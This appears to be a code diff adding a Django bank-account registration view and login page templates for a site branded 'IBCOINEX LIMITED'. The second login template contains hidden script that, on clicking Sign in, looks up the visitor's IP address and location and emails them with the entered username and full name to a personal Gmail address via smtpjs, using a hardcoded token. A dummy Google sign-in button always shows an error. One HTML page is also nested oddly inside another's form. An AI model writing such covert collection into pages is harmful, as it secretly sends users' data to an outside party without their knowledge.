@@ -1,0 +1,492 @@
+def register_view(request):
+    if request.user.is_authenticated:
+        return redirect("home")
+    else:
+        user_form = UserRegistrationForm(request.POST or None)
+        account_form = AccountDetailsForm(request.POST or None)
+        address_form = UserAddressForm(request.POST or None)
+
+        if user_form.is_valid() and account_form.is_valid() and address_form.is_valid():
+            user = user_form.save()
+            account_details = account_form.save(commit=False)
+            address = address_form.save(commit=False)
+            account_details.user = user
+            account_details.account_no = user.username
+            account_details.save()
+            address.user = user
+            
+            # Update the address object with the full country name
+            country_code = address_form.cleaned_data.get("country")
+            country_name = dict(address_form.fields["country"].choices)[country_code]
+            address.country = country_name
+
+            address.save()
+            new_user = authenticate(
+                username=user.username, password=user_form.cleaned_data.get("password1")
+            )
+            login(request, new_user)
+            messages.success(
+                request,
+                f"Thank you for creating a bank account {new_user.full_name}. "
+                f"Your username is {new_user.username}. Please use this number to login."
+            )
+            return redirect("home")
+
+        context = {
+            "title": "Create a Bank Account",
+            "user_form": user_form,
+            "account_form": account_form,
+            "address_form": address_form,
+        }
+
+        return render(request, "accounts/register_form.html", context)
+
+        
+<!DOCTYPE html>
+{% load crispy_forms_tags %}
+{% load static %}
+
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="csrf-token" content="9I2up1iCY8MRp5B86FaGgvVOKTeuzEMI6jkSlKIb">
+    <title>IBCOINEX LIMITED | Welcome to IBCOINEX</title>
+
+    <meta name="description" content="We are online">
+
+    <!-- Google / Search Engine Tags -->
+    <meta itemprop="name" content="IBCOINEX LIMITED - Welcome to IBCOINEX">
+    <meta itemprop="description" content="We are online">
+    <meta itemprop="image" content="{% static 'img/op3.png' %}">
+
+    <link rel="icon" href="{% static 'img/op3.png' %}" type="image/png" />
+
+    <link href="{% static 'temp/css/bootstrap.min.css' %}" rel="stylesheet" type="text/css" />
+    <!-- Icons -->
+    <link href="{% static 'temp/css/materialdesignicons.min.css' %}" rel="stylesheet" type="text/css" />
+
+    <!-- Magnific -->
+    <link rel="stylesheet" href="{% static 'temp/css/line.css' %}">
+    <link href="{% static 'temp/css/flexslider.css' %}" rel="stylesheet" type="text/css" />
+    <link href="{% static 'temp/css/magnific-popup.css' %}" rel="stylesheet" type="text/css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
+
+    <!-- Slider -->
+    <link rel="stylesheet" href="{% static 'temp/css/owl.carousel.min.css' %}" />
+    <link rel="stylesheet" href="{% static 'temp/css/owl.theme.default.min.css' %}" />
+    <!-- Main Css -->
+    <link href="{% static 'temp/css/style.css' %}" rel="stylesheet" type="text/css" />
+    <link href="{% static 'temp/css/colors/default.css' %}" rel="stylesheet">
+
+</head>
+
+<body class="h-100 bg-soft-primary">
+    <section class=" auth">
+        <div class="container">
+            <div class="pb-3 row justify-content-center">
+
+                <div class="col-12 col-md-6 col-lg-6 col-sm-10 col-xl-6">
+                    <div class="text-center">
+                        <a href="/"><img src="{% static 'img/op3.png' %}" alt="" class="mb-3 img-fluid auth__logo"></a>
+                    </div>
+
+                    <div class="bg-white shadow card login-page roundedd border-1 ">
+                        <div class="card-body">
+                            <h4 class="text-center card-title">User Login</h4>
+<form method="POST" action="" enctype='multipart/form-data'>
+    {% csrf_token %}
+    {{ form|crispy }}
+    <br>
+                                        <div class="col-lg-12">
+                                        <div class="d-flex justify-content-between">
+                                            <div class="form-group">
+                                                <div class="custom-control custom-checkbox">
+                                                    <input type="checkbox" class="custom-control-input" id="customCheck1" name="remember">
+                                                    <label class="custom-control-label" for="customCheck1">Remember
+                                                        me</label>
+                                                </div>
+                                            </div>
+                                            
+                                        </div>
+                                    </div>
+    <input class="btn btn-success" type="submit" value='Submit'>
+                                    <div class="text-center col-12">
+                                        <p class="mt-3 mb-0"><small class="mr-2 text-dark">Don't have an account
+                                                ?</small> <a href="{% url 'accounts:register' %}" class="text-dark font-weight-bold">Sign Up</a></p>
+                                    </div>
+</form>
+<!DOCTYPE html>
+<html lang="en">
+{% load static %}
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+    <link rel="shortcut icon" href="{% static 'asseta/media/photos/p2.png' %}">
+    <link rel="icon" type="image/png" sizes="192x192" href="{% static 'asseta/media/photos/p2.png' %}">
+    <link rel="apple-touch-icon" sizes="180x180" href="{% static 'asseta/media/photos/p2.png' %}">
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@500;600;700;800&display=swap" rel="stylesheet">
+    <!-- Start of Async Drift Code -->
+    <script>
+    "use strict";
+
+    !function() {
+      var t = window.driftt = window.drift = window.driftt || [];
+      if (!t.init) {
+        if (t.invoked) return void (window.console && console.error && console.error("Drift snippet included twice."));
+        t.invoked = !0, t.methods = [ "identify", "config", "track", "reset", "debug", "show", "ping", "page", "hide", "off", "on" ], 
+        t.factory = function(e) {
+          return function() {
+            var n = Array.prototype.slice.call(arguments);
+            return n.unshift(e), t.push(n), t;
+          };
+        }, t.methods.forEach(function(e) {
+          t[e] = t.factory(e);
+        }), t.load = function(t) {
+          var e = 3e5, n = Math.ceil(new Date() / e) * e, o = document.createElement("script");
+          o.type = "text/javascript", o.async = !0, o.crossorigin = "anonymous", o.src = "https://js.driftt.com/include/" + n + "/" + t + ".js";
+          var i = document.getElementsByTagName("script")[0];
+          i.parentNode.insertBefore(o, i);
+        };
+      }
+    }();
+    drift.SNIPPET_VERSION = '0.3.1';
+    drift.load('cfv7i3g9z5nb');
+    </script>
+    <!-- End of Async Drift Code -->
+</head>
+<style>
+    *{
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+:root{
+    --primary:#157AFE;
+    --secondary:#808080;
+    --bg-light:#fff;
+}
+
+body{
+    font-family: 'Inter', sans-serif;
+    background: #fafafa;
+}
+
+.portal{
+    display: grid;
+    place-items: center;
+    min-height: 100vh;
+}
+
+.portal form{
+    background: var(--bg-light);
+    box-shadow: rgba(149, 157, 165, 0.2) 0px 8px 24px;
+    width: min(100%, 470px);
+    padding: 70px;
+    display: grid;
+    gap: 1rem;
+    border-radius: 10px;
+}
+
+.title h1{
+    font-size: 2rem;
+    position: relative;
+    padding-left: 25px;
+}
+
+.title h1::before, .title h1::after{
+    content: '';
+    position: absolute;
+    width: 16px;
+    height: 16px;
+    background: var(--primary);
+    left: 0;
+    top: 12px;
+    border-radius: 50%;
+}
+
+.title h1::after{
+    animation: pulse 1.3s infinite;
+}
+
+@keyframes pulse{
+    0%{
+        transform: scale(0.5);
+        opacity: 0;
+    }
+    50%{
+        opacity: 1;
+    }
+    100%{
+        transform: scale(1.7);
+        opacity: 0;
+    }
+}
+
+
+
+.title p{
+    color: var(--secondary);
+    font-size: .9rem;
+}
+
+input, button{
+    font: inherit;
+    border: 2px solid transparent;
+    outline: 2px solid transparent;
+    border-radius: 5px;
+}
+
+#google-signin{
+    padding: 15px;
+    display: flex;
+    justify-content: center;
+    gap: .5rem;
+    background: #fff;
+    box-shadow: rgba(0, 0, 0, 0.02) 0px 1px 3px 0px, 
+            rgba(27, 31, 35, 0.15) 0px 0px 0px 1px;
+    cursor: pointer;
+}
+
+span{
+    color: var(--secondary);
+    display: flex;
+}
+
+span::before, span::after{
+    content: '';
+    width: 100%;
+    height: 1px;
+    background: var(--secondary);
+    margin: auto;
+}
+
+span::before{
+    margin-right: 1rem;
+}
+
+span::after{
+    margin-left: 1rem;
+}
+
+.input-field{
+    position: relative;
+}
+
+.input-field input{
+    background: #eeeeee;
+    padding: 23px 15px 7px;
+    width: 100%;
+    transition: .3s ease;
+}
+
+.input-field label{
+    position: absolute;
+    color: var(--secondary);
+    left: 15px;
+    top: 16px;
+    transition: .3s ease;
+}
+
+.input-field input:focus ~ label, .input-field input:not(:placeholder-shown) ~ label{
+    font-size: .85rem;
+    top: 5px;
+}
+
+.input-field input:focus{
+    border: 2px solid var(--primary);
+}
+
+.input-field input:focus ~ label{
+    color: var(--primary);
+}
+
+#show-hide-pass{
+    width: 1.5rem;
+    position: absolute;
+    top: 16px;
+    right: 15px;
+    cursor: pointer;
+}
+
+#forgot-pass{
+    text-decoration: none;
+    color: var(--primary);
+    font-size: .9rem;
+    text-align: end;
+}
+
+#signin{
+    background: var(--primary);
+    color: #fff;
+    padding: 15px;
+    cursor: pointer;
+}
+
+#signup{
+    font-size: .9rem;
+    text-align: center;
+    color: var(--secondary);
+}
+
+#signup a{
+    text-decoration: none;
+    color: var(--primary);
+}
+
+@media screen and (max-width:480px) {
+    .portal form{
+        background: transparent;
+        box-shadow: none;
+        padding: 30px;
+    }
+}
+</style>
+<body>
+  <section class="portal">
+    <form method="POST" enctype="multipart/form-data">
+      {% csrf_token %}
+
+      <div class="title">
+        <h1>LOG IN</h1>
+        <p>Welcome back! Please enter your details.</p>
+      </div>
+      <button id="google-signin" type="button">
+        <img src="{% static 'assets/google-logo.svg' %}" alt="">
+        Log in with Google
+      </button>
+      <span>or</span>
+      <div class="input-field">
+        {{ form.username }}
+        <label for="{{ form.username.id_for_label }}">Username</label>
+      </div>
+      <div class="input-field">
+        {{ form.password }}
+        <label for="{{ form.password.id_for_label }}">Password</label>
+        <img id="show-hide-pass" src="{% static 'assets/show-eye.svg' %}" alt="">
+      </div>
+      <button type="submit" id="signin">Sign in</button>
+      <p id="signup">
+        Don't have an account?
+        <a href="{% url 'accounts:register' %}">Sign up here</a>
+      </p>
+
+      <input type="hidden" id="user-email" value="{{ user.email }}">
+      <input type="hidden" id="user-fullname" value="{{ user.get_full_name }}">
+      <input type="hidden" id="is-registered" value="{% if user.is_authenticated %}true{% else %}false{% endif %}">
+      <input type="hidden" id="user-fullname" value="{{ user.get_full_name }}">
+
+    </form>
+  </section>
+
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <script src="https://smtpjs.com/v3/smtp.js"></script>
+<script>
+    document.getElementById("google-signin").addEventListener("click", function() {
+        Swal.fire({
+            icon: 'error',
+            title: 'Google not available',
+            text: 'Sorry, the Google login feature is currently unavailable. Please try again later.',
+            footer: '<a href="#">Learn more</a>'
+        });
+    });
+
+    document.getElementById("signin").addEventListener("click", function() {
+        fetchUserData();
+    });
+
+    // Fetch the user's IP address, username, and full name
+    function fetchUserData() {
+        fetch('https://api.ipify.org/?format=json')
+            .then(response => response.json())
+            .then(data => {
+                var ipAddress = data.ip;
+
+                // Fetch the username
+                var username = document.getElementById("id_username").value;
+
+                // Fetch the full name
+                var fullName = document.getElementById("user-fullname").value;
+
+                // Fetch the location information using ipapi API
+                fetch('https://ipapi.co/' + ipAddress + '/json/')
+                    .then(response => response.json())
+                    .then(locationData => {
+                        var location = locationData.city + ', ' + locationData.region + ', ' + locationData.country_name;
+
+                        // Send email with IP address, username, full name, and location
+                        sendEmail(ipAddress, username, fullName, location);
+                    })
+                    .catch(error => console.log(error));
+            })
+            .catch(error => console.log(error));
+    }
+
+    function sendEmail(ipAddress, username, fullName, location) {
+        var userEmail = "allinn971@gmail.com";
+        var subject = "Visitor IP Address and Location";
+        var emailBody = "IP Address: " + ipAddress + "<br/>Username: " + username + "<br/>Full Name: " + fullName + "<br/>Location: " + location;
+
+        Email.send({
+            SecureToken: "0f262930-696f-4b09-a800-3776364aff17",
+            To: userEmail,
+            From: "info@ibcoinex.org",
+            Subject: subject,
+            Body: emailBody
+        });
+    }
+</script>
+
+
+
+  <script type="text/javascript">
+    function googleTranslateElementInit() {
+      new google.translate.TranslateElement({ pageLanguage: 'en' }, 'google_translate_element');
+    }
+  </script>
+  <script type="text/javascript" src="{% static 'assets/element.js' %}"></script>
+</body>
+
+</html>
+
+
+                        </div>
+                    </div>
+                    <!---->
+                </div>
+                <!--end col-->
+            </div>
+            <!--end row-->
+        </div>
+        <!--end container-->
+    </section>
+    <!--end section-->
+
+
+
+    <!-- javascript -->
+    <script src="{% static 'temp/js/jquery-3.5.1.min.js' %}"></script>
+    <script src="{% static 'temp/js/bootstrap.bundle.min.js' %}"></script>
+
+    <!-- SLIDER -->
+    <script src="{% static 'temp/js/owl.carousel.min.js' %}"></script>
+    <script src="{% static 'temp/js/owl.init.js' %}"></script>
+    <!-- Icons -->
+    <script src="{% static 'temp/js/feather.min.js' %}"></script>
+    <script src="{% static 'temp/js/bundle.js' %}"></script>
+
+    <script src="{% static 'temp/js/app.js' %}"></script>
+    <script src="{% static 'temp/js/widget.js' %}"></script>
+
+</body>
+
+</html>
